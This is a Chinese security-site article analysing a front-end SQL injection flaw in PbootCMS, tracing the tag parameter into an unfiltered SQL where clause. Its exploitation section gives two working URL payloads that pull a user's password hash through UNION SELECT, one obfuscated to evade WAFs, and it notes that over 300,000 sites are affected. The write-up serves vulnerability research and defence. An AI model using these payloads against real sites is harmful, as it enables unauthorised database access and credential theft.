---
title: PbootCMS前台SQL注入漏洞（下）
url: https://www.4hou.com/posts/ZgX8
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2024-12-28
fetch_date: 2025-10-06T19:36:56.655311
---

# PbootCMS前台SQL注入漏洞（下）

PbootCMS前台SQL注入漏洞（下） - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# PbootCMS前台SQL注入漏洞（下）

盛邦安全
[行业](https://www.4hou.com/category/industry)
2024-12-27 15:42:51

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)59752

收藏

导语：本文将在前一篇文章的基础上继续给出新的PbootCMS SQL注入漏洞，并对利用方式进行更深入的探讨。

## 0x01前言

在前一篇文章中介绍了一个仍然可以用于最新版PbootCMS的老漏洞DVB-2021-2510,并对漏洞流程进行分析，给出了在有限条件下利用漏洞的方式。

本文将在前一篇文章的基础上继续给出新的PbootCMS SQL注入漏洞，并对利用方式进行更深入的探讨。

## 0x02漏洞分析

由于PbootCMS使用了模板的方法来组合产品页面内容，为了支持可扩展性，支持非常复杂的语法，对基础内容想了解的可以先看文章https://xz.aliyun.com/t/14090。

apps/home/controller/TagController.php文件中，会把外部传入的数据get('tag')替换模板文件中的内容。

![](https://image.3001.net/images/20241224/1735030240_676a75e090c2498beb00c.png!small)

图 1

这里的get('tag')和上一篇文章中的request($key, 'vars')有一个很大的区别是没有第二个参数，我们跟进get方法，看一下没有第二个参数的传值有哪些限制。

![](https://image.3001.net/images/20241224/1735030266_676a75fa19e04c407d882.png!small)

图 2

如果没有传入第二个参数，默认值为null。跟进filter方法，可以看出在filter对类型和数据的安全检查中，第二个参数为null并不会命中任何一个条件判断，也就是不会对数据值进行任何限制。这里因为$condition['d\_type']为null也不会因此而报错。

![](https://image.3001.net/images/20241224/1735030286_676a760e5a238ab53a46f.png!small)

图 3

虽然数据类型检测，但是filter方法中仍然有对其值的过滤方式，会替换很多标签相关的内容。这里需要重点标记一下，因为后面的SQL注入要用到这里过滤不完整的标签。

![](https://image.3001.net/images/20241224/1735030314_676a762ab4ef73a5a5700.png!small)

图 4

回到图1的代码中，外部传入的get('tag')经过方法parserPositionLabel会替换模板文件中的部分内容，跟进parserPositionLabel方法。

![](https://image.3001.net/images/20241224/1735030334_676a763e8ebce9d672e92.png!small)

图 5

这里外部传入的数据变成了变量$link，并且经过替换之后响应到页面的标签的href属性中。这里假设我们传入了{pboot:xxx}，只要不在图4禁止的pboot标签中，则可能导致标签注入。pboot支持的标签有很多，具体要用哪个标签来达到漏洞利用的效果，还需要继续往下面跟进。

在图1的代码中继续往下，跟进parserAfter方法，这个方法中会解析大多数pboot标签。

![](https://image.3001.net/images/20241224/1735030355_676a76537ad7410a0a112.png!small)

图 6

我们这里用到的是parserListLabel方法，这个方法的主要作用是解析数据列表，至于是不是还有其它的方法也可以利用，小伙伴可以自行探索。继续跟进parserListLabel方法。

![](https://image.3001.net/images/20241224/1735030373_676a7665b0cd1f74560c2.png!small)

图 7

如果我们传入的get('tag')的值中包含了{pboot:list}标签，则会按照parserListLabel方法中的解析逻辑对其中的值进行正则提取，并保存到变量$params中。具体parserParam的函数我就不跟了，其实就是简单的正则提取，我们继续往下跟进$params变量的处理逻辑。

![](https://image.3001.net/images/20241224/1735030393_676a7679f38b1a6668911.png!small)

图 8

当$params的键名是filter时，也就是外部传入的参数为{pboot:list filter=xxx [list:link link=asd]{/pboot:list}。会把xxxx设置为变量$filter的值，继续跟下面的调用逻辑。

![](https://image.3001.net/images/20241224/1735030428_676a769c73f0c67724b7f.png!small)

图9

按照｜对$filter进行切割之后，其中$filter[0]会直接拼接到$where1数组的值中，从这里已经可以看出来似乎进行了SQL语句的可控拼接。继续往下看一下$where1变量的调用逻辑。

![](https://image.3001.net/images/20241224/1735030452_676a76b473b3442ef6d6b.png!small)

图10

和上一篇文章的逻辑相似，上一篇文章的注入点在getList方法的参数$where3，这次的注入在参数$where1。跟进getList方法。

![](https://image.3001.net/images/20241224/1735030479_676a76cf5cda524776c05.png!small)

图11

外部传入的$where1变量会直接进入where方法中，从图9可以看出这里的filter时一个数组，并且其键名为数字。

![](https://image.3001.net/images/20241224/1735030512_676a76f02fa5a7bf390c5.png!small)

图12

这也就导致了SQL注入漏洞。

## 0x03漏洞利用

从本质上来说此漏洞的漏洞利用要比上一篇文章的利用简单，因为这里不涉及对特殊字符的限制，而且这里有回显可以进行联合注入。在本地搭建的演示环境中进行测试，利用下面的payload查询ay\_user表第一个用户的密码字段

> http://localhost:8890/PbootCMS329?tag=xxx:%7bpboot%3alist%20filter%3d1%3d2%29UNION%2f%2a%2a%2fSELECT%2f%2a%2a%2f1,2,3,4,5,(select/\*\*/password/\*\*/from/\*\*/ay\_user/\*\*/limit/\*\*/0,1),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c123%20scode%3d123%7d%5blist%3alink%20link%3dasd%5d%7b%2fpboot%3alist%7d

查看源代码，会在如下位置回显对应的结果信息

![](https://image.3001.net/images/20241224/1735030544_676a77107a935e05b9eb9.png!small)

图13

这里面有几个注意点是需要说明的

1）payload不允许用空格，因为在图7解析{pboot:list}标签时调用的parserParam方法按照空格进行截断，如下所示。

![](https://image.3001.net/images/20241224/1735030573_676a772d4ff9d6eb1f6d3.png!small)

图14

2)  注释符问题。对于mysql数据库，这里只能使用#单行注释，而不能使用--单行注释；对于sqlite数据库，这里只能使用--单行注释，而不能使用#单行注释。这主要还是空格的原因，我通过下面一张表来说明这个小技巧。

|  |  |  |
| --- | --- | --- |
| 语句 | 数据库 | 备注 |
| select 1 --a | mysql | 语法错误，--后面必须有空白字符 |
| select 1 --/\*\*/a | mysql | 语法错误，--后面必须有空白字符 |
| select 1 -- a | mysql | 语法正确 |
| select 1 #a | mysql | 语法正确 |
| select 1 # a | mysql | 语法正确 |
| select 1 --a | sqlite | 语法正确，--后面可以没有空格 |
| select 1 -- a | sqlite | 语法正确 |
| select 1 #a | sqlite | 语法错误，不支持#注释 |
| select 1 # a | sqlite | 语法错误，不支持#注释 |

因为PbootCMS的payload不允许使用空格，所以造成了一个很奇怪的结论。

3) 在实网环境下，不同的站点union select的函数是不一样的，要基于实际情况进行调整。

虽然我们现在已经能完全的对目标进行注入（包括mysql和sqlite两种数据库），而且是有回显的联合查询，但是当前的payload特征非常明显，极易被WAF查杀。有没有某种绕过WAF的方式呢？

当然是有的，PbootCMS有复杂的模板替换逻辑，只要找一个字符串替换为空的操作，然后在关键字中一直插入干扰字符，就可以轻易绕过WAF，如果你现在倒回去看一下图4，你就会发现x3e｜x3c会是一个不错的选择，例如你可以使用使用下面的payload

> http://localhost:8890/PbootCMS329?tag=xxx:%7bpboot%3alist%20filter%3d1%3d2%29UNIx3eON%2fx3e%2a%2a%2fSELx3eECT%2fx3e%2a%2a%2f1,2,3,4,5,(selx3eect/\*\*/pax3essword/\*\*/frx3eom/x3e\*\*/ay\_user/\*\*/lix3emit/x3e\*\*/0,1),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c123%20scode%3d123%7d%5blist%3alink%20link%3dasd%5d%7b%2fpboot%3alist%7d

## 0x04 结论

当前我们已经能无限制的对PbootCMS进行SQL注入了，有超过30W的互联网案例都受此漏洞影响。我认为这是2024最好用的漏洞，你觉得呢？

[原文链接](https://mp.weixin.qq.com/s/ZPYwrPyw_W_cEBVsm_McTw)

如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后点击右上角即可分享哟

### 发表评论

评论

![](https://www.4hou.com/captcha/flat?q5me0sp0)

#### 你可能感兴趣的

* [![]()

  Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)
* [![]()

  【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)
* [![]()

  蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)
* [![]()

  聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)
* [![]()

  2025第五届太原网络安全高峰论坛成功举办](https://www.4hou.com/posts/8gJl)
* [![]()

  特勤局手册 | 监听办公室](https://www.4hou.com/posts/42B2)

![](https://img.4hou.com/portraits/3c8d3af7c49c95c16dd14518142759d6.png)

# [盛邦安全](https://www.4hou.com/member/9ZO4)

让网络空间更有序

#### 最新文章

* [Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)
  2025-09-29 17:48:04
* [【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)
  2025-09-29 14:55:37
* [蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)
  2025-09-29 14:23:50
* [聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)
  2025-09-28 17:20:40

[查看更多](https://www.4hou.com/member/9ZO4)

# 相关热文

* [Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)

  CACTER
* [【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)

  网络伍豪
* [蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)

  梆梆安全
* [聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)

  企业资讯
* [2025第五届太原网络安全高峰论坛成功举办](https://www.4hou.com/posts/8gJl)

  企业资讯
* [特勤局手册 | 监听办公室]...